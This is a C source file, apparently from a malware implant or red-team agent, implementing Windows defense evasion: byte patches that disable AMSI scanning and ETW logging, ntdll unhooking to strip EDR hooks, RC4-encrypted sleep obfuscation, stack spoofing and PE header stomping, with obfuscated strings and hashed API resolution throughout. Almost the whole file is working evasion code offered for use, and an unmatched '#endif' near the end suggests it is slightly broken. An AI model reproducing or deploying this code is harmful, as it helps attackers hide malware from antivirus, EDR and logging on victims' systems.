/*
 * evasion_runtime.c — Run-time evasion: AMSI, ETW, ntdll unhook, sleep obfuscation.
 *
 * These patches are applied after agent_init, during the agent's lifetime.
 */
#include "agent.h"
#include "evasion.h"
#include "stack_spoof.h"
#include "pe_stomp.h"
#include "api_resolve.h"
#include "syscalls.h"

#if CONFIG_INDIRECT_SYSCALLS
#include "syscalls.h"
#include "syscalls_wrappers.h"
#endif

/* ─── P/Invoke declarations for evasion ─── */

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

/* SystemFunction032 — undocumented RC4 in advapi32.dll */
typedef struct {
    ULONG Length;
    ULONG MaximumLength;
    PUCHAR Buffer;
} USTRING;

typedef NTSTATUS (WINAPI *pSystemFunction032)(USTRING *data, USTRING *key);


/* ═══════════════════════════════════════════════════════════════════
 *  AMSI PATCH
 * ═══════════════════════════════════════════════════════════════════ */

BOOL evasion_patch_amsi(void) {
    /*
     * Patch AmsiScanBuffer to return E_INVALIDARG immediately.
     *
     * Target: amsi.dll!AmsiScanBuffer
     * x64 patch: mov eax, 0x80070057; ret
     *   Bytes: B8 57 00 07 80 C3
     *
     * All API resolution via PEB walk + DJB2 hashing — no plaintext strings.
     */

    /* Resolve LoadLibraryA via PEB walk to load amsi.dll */
    typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
    pLoadLibraryA fnLoadLib = (pLoadLibraryA)api_resolve(HASH_KERNEL32, HASH_LoadLibraryA);
    if (!fnLoadLib) return TRUE;

    /* Decrypt "amsi.dll" on the stack */
    char amsi_name[] = { 'a'^0x5A, 'm'^0x5A, 's'^0x5A, 'i'^0x5A, '.'^0x5A,
                         'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0 };
    for (int i = 0; amsi_name[i]; i++) amsi_name[i] ^= 0x5A;

    HMODULE hAmsi = fnLoadLib(amsi_name);
    SecureZeroMemory(amsi_name, sizeof(amsi_name));
    if (!hAmsi) return TRUE;  /* AMSI not loaded — nothing to patch */

    /* Resolve AmsiScanBuffer by hash from the loaded amsi module */
    #define HASH_AmsiScanBuffer 0x29FCD18E
    void *pFunc = api_resolve_from_module(hAmsi, HASH_AmsiScanBuffer);
    if (!pFunc) return FALSE;

    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect;
    SIZE_T patchSize = sizeof(patch);
    void *pBase = pFunc;

    /* Use NtProtectVirtualMemory via PEB-resolved hash */
    #define HASH_NtProtectVirtualMemory_RT 0x082962C8
    pNtProtectVirtualMemory NtPVM = (pNtProtectVirtualMemory)
        api_resolve(HASH_NTDLL, HASH_NtProtectVirtualMemory_RT);

    if (NtPVM) {
        NTSTATUS st = NtPVM(GetCurrentProcess(), &pBase, &patchSize,
                            PAGE_EXECUTE_READWRITE, &oldProtect);
        if (!NT_SUCCESS(st)) return FALSE;
    } else {
        if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
            return FALSE;
    }

    memcpy(pFunc, patch, sizeof(patch));

    if (NtPVM)
        NtPVM(GetCurrentProcess(), &pBase, &patchSize, oldProtect, &oldProtect);
    else
        VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);

    return TRUE;
}


/* ═══════════════════════════════════════════════════════════════════
 *  ETW PATCH
 * ═══════════════════════════════════════════════════════════════════ */

BOOL evasion_patch_etw(void) {
    /*
     * Patch EtwEventWrite to return 0 (SUCCESS) immediately.
     * Prevents CLR ETW events: assembly loads, JIT compilation, etc.
     *
     * x64 patch: xor rax, rax; ret
     *   Bytes: 48 33 C0 C3
     *
     * Resolved via PEB walk — no plaintext "ntdll.dll" or "EtwEventWrite".
     */
    #define HASH_EtwEventWrite 0x24A8D022
    void *pFunc = api_resolve(HASH_NTDLL, HASH_EtwEventWrite);
    if (!pFunc) return FALSE;

    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
    DWORD oldProtect;

    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    memcpy(pFunc, patch, sizeof(patch));
    VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);

    return TRUE;
}


/* ═══════════════════════════════════════════════════════════════════
 *  NTDLL UNHOOK
 * ═══════════════════════════════════════════════════════════════════ */

/* Relocation type constants (MinGW safety) */
#ifndef IMAGE_REL_BASED_DIR64
#define IMAGE_REL_BASED_DIR64  10
#endif

/*
 * After copying .text from the clean SEC_IMAGE mapping (based at pClean)
 * into the loaded ntdll (based at hNtdll), absolute addresses in .text
 * still point relative to pClean.  Fix them by adding the delta so they
 * point relative to hNtdll.  Without this, any relocated instruction
 * (jump tables, global refs) is corrupted — breaking NtCreateThreadEx
 * and every function that depends on an absolute address.
 */
static void _fixup_text_relocations(BYTE *pLoadedBase, BYTE *pCleanBase,
                                     PIMAGE_NT_HEADERS pNtHeaders,
                                     DWORD textRVA, DWORD textSize)
{
    LONG_PTR delta = (LONG_PTR)(pLoadedBase - pCleanBase);
    if (delta == 0) return;  /* Same base — nothing to fix */

    DWORD relocDirRVA  = pNtHeaders->OptionalHeader
                             .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
                             .VirtualAddress;
    DWORD relocDirSize = pNtHeaders->OptionalHeader
                             .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
                             .Size;
    if (relocDirRVA == 0 || relocDirSize == 0) return;

    /* Walk the .reloc section in the LOADED ntdll (we didn't overwrite it) */
    BYTE *pReloc    = pLoadedBase + relocDirRVA;
    DWORD processed = 0;
    DWORD fixCount  = 0;

    while (processed < relocDirSize) {
        IMAGE_BASE_RELOCATION *block = (IMAGE_BASE_RELOCATION *)(pReloc + processed);
        if (block->SizeOfBlock == 0 || block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION))
            break;

        DWORD nEntries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD *entries  = (WORD *)((BYTE *)block + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < nEntries; i++) {
            BYTE  type   = (BYTE)(entries[i] >> 12);
            WORD  offset = entries[i] & 0x0FFF;

            if (type == IMAGE_REL_BASED_ABSOLUTE) continue;  /* padding */

            DWORD entryRVA = block->VirtualAddress + offset;

            /* Only fix entries that land inside .text */
            if (entryRVA < textRVA || entryRVA >= textRVA + textSize)
                continue;

            BYTE *pPatch = pLoadedBase + entryRVA;

            if (type == IMAGE_REL_BASED_DIR64) {          /* x64: 8-byte abs addr */
                *(ULONGLONG *)pPatch += (ULONGLONG)delta;
                fixCount++;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) { /* x86: 4-byte abs addr */
                *(ULONG *)pPatch += (ULONG)delta;
                fixCount++;
            }
        }

        processed += block->SizeOfBlock;
    }

    DBG("[evasion] ntdll reloc fixup: delta=0x%llX, %u entries patched in .text",
        (unsigned long long)delta, fixCount);
}

BOOL evasion_unhook_ntdll(void) {
    /*
     * Restore ntdll.dll .text section from a clean copy on disk.
     *
     * EDRs hook ntdll by overwriting the first bytes of functions with
     * JMP instructions to their monitoring code. We read the original
     * ntdll.dll from C:\Windows\System32\ntdll.dll, map it as SEC_IMAGE,
     * and overwrite the hooked .text section with the clean one.
     *
     * CRITICAL: the SEC_IMAGE mapping lands at a different ASLR base
     * than the loaded ntdll.  After copying .text, we must fix up
     * absolute-address relocations by adding the base delta.  Without
     * this, NtCreateThreadEx and other functions with relocation entries
     * are corrupted, breaking all thread creation in the process.
     */
    HMODULE hNtdll = NULL;
    {
        void *anyFunc = api_resolve(HASH_NTDLL, HASH_NtClose);
        if (!anyFunc) return FALSE;
        /* Walk backwards to find module base (PE header) */
        unsigned char *p = (unsigned char *)anyFunc;
        /* Align down to 64K boundary and search for MZ header */
        p = (unsigned char *)((ULONG_PTR)p & ~0xFFFF);
        for (int i = 0; i < 256; i++) {
            if (*(USHORT *)p == IMAGE_DOS_SIGNATURE) {
                hNtdll = (HMODULE)p;
                break;
            }
            p -= 0x10000;
        }
    }
    if (!hNtdll) return FALSE;

    DBG("[evasion] ntdll loaded base = %p", (void *)hNtdll);

    /* Read clean ntdll from disk */
    wchar_t ntdllPath[MAX_PATH];
    GetSystemDirectoryW(ntdllPath, MAX_PATH);
    wcscat(ntdllPath, L"\\ntdll.dll");

    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    HANDLE hMapping = CreateFileMappingW(hFile, NULL,
                                         PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return FALSE;
    }

    void *pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pClean) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    DBG("[evasion] ntdll clean mapping base = %p (delta=0x%llX)",
        pClean, (unsigned long long)((BYTE *)hNtdll - (BYTE *)pClean));

    /* Use loaded ntdll's PE headers (intact at this point — PE stomp runs later) */
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
        ((BYTE *)hNtdll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    WORD numSections = ntHeaders->FileHeader.NumberOfSections;

    BOOL patched = FALSE;

    for (WORD i = 0; i < numSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            DWORD textSize = section[i].Misc.VirtualSize;
            DWORD textRVA  = section[i].VirtualAddress;

            void *pHooked   = (BYTE *)hNtdll + textRVA;
            void *pOriginal = (BYTE *)pClean + textRVA;

            DBG("[evasion] ntdll .text: RVA=0x%X size=0x%X", textRVA, textSize);

            /* Make hooked .text writable */
            DWORD oldProtect;
            if (!VirtualProtect(pHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                DBG("[evasion] VirtualProtect failed err=%u", GetLastError());
                break;
            }

            /* Overwrite hooked .text with clean bytes */
            memcpy(pHooked, pOriginal, textSize);

            /* Fix up absolute-address relocations for the base delta */
            _fixup_text_relocations((BYTE *)hNtdll, (BYTE *)pClean,
                                     ntHeaders, textRVA, textSize);

            /* Restore protection */
            VirtualProtect(pHooked, textSize, oldProtect, &oldProtect);
            patched = TRUE;
            DBG("[evasion] ntdll .text restored + relocations fixed");
            break;
        }
    }

    UnmapViewOfFile(pClean);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return patched;
}


/* ═══════════════════════════════════════════════════════════════════
 *  SLEEP OBFUSCATION (Ekko-style)
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * Ekko sleep obfuscation:
 *   1. Get the base and size of the agent's PE image in memory
 *   2. Encrypt the image with RC4 (SystemFunction032)
 *   3. Change memory protection to RW (non-executable)
 *   4. Sleep for the requested duration
 *   5. Change memory back to RX
 *   6. Decrypt with same RC4 key
 *
 * During sleep, the agent's code is encrypted AND non-executable.
 * Memory scanners see encrypted garbage in non-executable pages.
 *
 * This is a simplified version. The full Ekko uses ROP chains via
 * timer callbacks (CreateTimerQueueTimer + NtContinue) to avoid
 * having executable code during the encrypt/sleep/decrypt sequence.
 * That requires precise CONTEXT manipulation — implemented as a
 * future enhancement.
 */

static void _get_module_bounds(void **base, DWORD *size) {
    HMODULE hSelf = GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hSelf;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE *)hSelf + dos->e_lfanew);
    *base = (void *)hSelf;
    *size = nt->OptionalHeader.SizeOfImage;
}

void evasion_sleep_obfuscated(DWORD milliseconds) {
#if CONFIG_SLEEP_OBFUSCATE
    /* Resolve SystemFunction032 (RC4) from advapi32 via PEB walk */
    #define HASH_SystemFunction032 0xCCCF3585
    pSystemFunction032 SystemFunction032 =
        (pSystemFunction032)api_resolve(HASH_ADVAPI32, HASH_SystemFunction032);
    if (!SystemFunction032) {
        Sleep(milliseconds);
        return;
    }

    void *imageBase;
    DWORD imageSize;
    _get_module_bounds(&imageBase, &imageSize);

    /*
     * Save per-section memory protections BEFORE we touch anything.
     *
     * The old code did a single VirtualProtect on the entire image and
     * saved one oldProtect value.  VirtualProtect returns the protection
     * of the FIRST page only.  On restore, ALL sections got that one
     * protection — .text lost RX, .data lost RW → crash after first
     * sleep cycle.
     *
     * Fix: walk PE sections, save each protection individually on the
     * stack (the stack is NOT part of the PE image, so it survives
     * encryption).  After decrypt, restore each section separately.
     */
    typedef struct { void *base; DWORD size; DWORD prot; } _SecProt;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE *)imageBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER secs = IMAGE_FIRST_SECTION(nt);
    WORD numSec = nt->FileHeader.NumberOfSections;
    DWORD hdrSize = nt->OptionalHeader.SizeOfHeaders;

    /* Max 32 sections + 1 for PE header = 33.  Real PEs rarely exceed 10. */
    _SecProt saved[33];
    int savedCount = 0;

    /* Save & change PE header protection */
    DWORD tmpProt;
    VirtualProtect(imageBase, hdrSize, PAGE_READWRITE, &tmpProt);
    saved[savedCount].base = imageBase;
    saved[savedCount].size = hdrSize;
    saved[savedCount].prot = tmpProt;
    savedCount++;

    /* Save & change each section */
    for (WORD i = 0; i < numSec && savedCount < 33; i++) {
        DWORD sSize = secs[i].Misc.VirtualSize;
        if (sSize == 0) sSize = secs[i].SizeOfRawData;
        if (sSize == 0) continue;

        void *sBase = (BYTE *)imageBase + secs[i].VirtualAddress;
        VirtualProtect(sBase, sSize, PAGE_READWRITE, &tmpProt);
        saved[savedCount].base = sBase;
        saved[savedCount].size = sSize;
        saved[savedCount].prot = tmpProt;
        savedCount++;
    }

    /* RC4 key — random per sleep cycle */
    unsigned char rc4Key[16];
    BCryptGenRandom(NULL, rc4Key, sizeof(rc4Key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    USTRING data = { imageSize, imageSize, (PUCHAR)imageBase };
    USTRING key  = { sizeof(rc4Key), sizeof(rc4Key), rc4Key };

    /* Spoof thread stack BEFORE encryption — hide agent return addresses.
     * Must happen while code is still executable and readable.
     * Only active when CONFIG_STACK_SPOOF is enabled (win11 builds). */
#if CONFIG_STACK_SPOOF
    void *spoof_ctx = NULL;
    spoof_thread_stack(&spoof_ctx);
#endif

    /* Encrypt with RC4 (image is already fully RW from per-section changes) */
    SystemFunction032(&data, &key);

    /* Sleep (agent code is encrypted + non-executable + stack spoofed) */
    Sleep(milliseconds);

    /* Decrypt with same RC4 key.
     * SystemFunction032 re-initializes KSA from key on each call,
     * so the same key produces the same keystream → decrypts correctly. */
    SystemFunction032(&data, &key);

    /* Restore each section's original protection from stack-saved array */
    for (int i = 0; i < savedCount; i++) {
        DWORD dummy;
        VirtualProtect(saved[i].base, saved[i].size, saved[i].prot, &dummy);
    }

    /* Restore real return addresses now that code is executable again */
#if CONFIG_STACK_SPOOF
    if (spoof_ctx)
        spoof_restore_thread_stack(spoof_ctx);
#endif

    /* Wipe key */
    SecureZeroMemory(rc4Key, sizeof(rc4Key));
#else
    Sleep(milliseconds);
#endif
}


/* ═══════════════════════════════════════════════════════════════════
 *  THREAD STACK SPOOFING
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * Simplified stack spoofing: before sleeping, overwrite the return address
 * on the stack with a benign address (e.g., inside kernel32!BaseThreadInitThunk).
 * Save the real return address, sleep, then restore it.
 *
 * This hides the agent from stack-walking tools that look for suspicious
 * return addresses (e.g., code running from VirtualAlloc'd memory).
 */

BOOL evasion_spoof_stack(void **saved_context) {
#if CONFIG_STACK_SPOOF
    return spoof_thread_stack(saved_context);
#else
    (void)saved_context;
    return FALSE;
#endif
}

void evasion_restore_stack(void *saved_context) {
#if CONFIG_STACK_SPOOF
    spoof_restore_thread_stack(saved_context);
#else
    (void)saved_context;
#endif
}


/* ═══════════════════════════════════════════════════════════════════
 *  MASTER INIT
 * ═══════════════════════════════════════════════════════════════════ */

BOOL evasion_stomp_pe_headers(void) {
#if CONFIG_PE_STOMP
    return pe_stomp_self();
#else
    return TRUE;
#endif
}

/* ─── Thread-creation probe (debug builds only) ─── */
#if CONFIG_DEBUG
static DWORD WINAPI _evasion_test_thread(LPVOID p) { (void)p; return 42; }

static void _probe_threads(const char *after_step) {
    HANDLE h = CreateThread(NULL, 0, _evasion_test_thread, NULL, 0, NULL);
    if (h) {
        WaitForSingleObject(h, 2000);
        CloseHandle(h);
        DBG("[evasion] thread probe OK after %s", after_step);
    } else {
        DBG("[evasion] thread probe FAILED after %s (err=%u)", after_step, GetLastError());
    }
}
#define PROBE(step) _probe_threads(step)
#else
#define PROBE(step) ((void)0)
#endif

/*
 * Win32-only early log helper — no CRT dependency.
 * -Wl,-e,main skips CRT init so fopen/fprintf don't work.
 */
#if CONFIG_DEBUG
static void _elog(const char *msg, DWORD len) {
    HANDLE h = CreateFileA("C:\\Windows\\Temp\\agent_early.log",
        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h, msg, len, &w, NULL);
        CloseHandle(h);
    }
}
#define ELOG(s) _elog(s, sizeof(s) - 1)
#else
#define ELOG(s) ((void)0)
#endif

BOOL evasion_init(void) {
    ELOG("[evasion] enter\r\n");

    /* Load-time: anti-analysis (exits agent if detected) */
    if (!anti_analysis_check()) {
        ELOG("[evasion] anti_analysis FAILED\r\n");
        return FALSE;
    }

    PROBE("anti_analysis");
    ELOG("[evasion] anti_analysis OK\r\n");

    /* Run-time patches — order matters:
     * 1. Unhook ntdll FIRST (restores clean syscalls for everything else)
     * 2. Patch ETW (prevent logging of subsequent operations)
     * 3. Patch AMSI (prevent scanning of loaded assemblies)
     * 4. Initialize indirect syscalls (after unhook for clean stubs)
     * 5. Initialize stack spoofing gadget cache
     * 6. Stomp PE headers LAST (after all PE-reading init is done)
     */
#if CONFIG_UNHOOK_NTDLL
    evasion_unhook_ntdll();
    PROBE("unhook_ntdll");
    ELOG("[evasion] unhook done\r\n");
#endif

#if CONFIG_PATCH_ETW
    evasion_patch_etw();
    PROBE("patch_etw");
    ELOG("[evasion] etw done\r\n");
#endif

#if CONFIG_PATCH_AMSI
    evasion_patch_amsi();
    PROBE("patch_amsi");
    ELOG("[evasion] amsi done\r\n");
#endif

#if CONFIG_INDIRECT_SYSCALLS
    if (syscall_init() != 0) {
        /* Some syscalls failed to resolve — non-fatal, continue */
    }
    sw_init();
    PROBE("indirect_syscalls");
    ELOG("[evasion] syscalls done\r\n");
#endif

#if CONFIG_STACK_SPOOF
    spoof_init();
    PROBE("stack_spoof");
    ELOG("[evasion] spoof done\r\n");
#endif

    /* PE stomp must be LAST — after all code that reads PE headers */
#if CONFIG_PE_STOMP
    evasion_stomp_pe_headers();
    PROBE("pe_stomp");
    ELOG("[evasion] stomp done\r\n");
#endif

    ELOG("[evasion] complete OK\r\n");
#endif

    return TRUE;
}
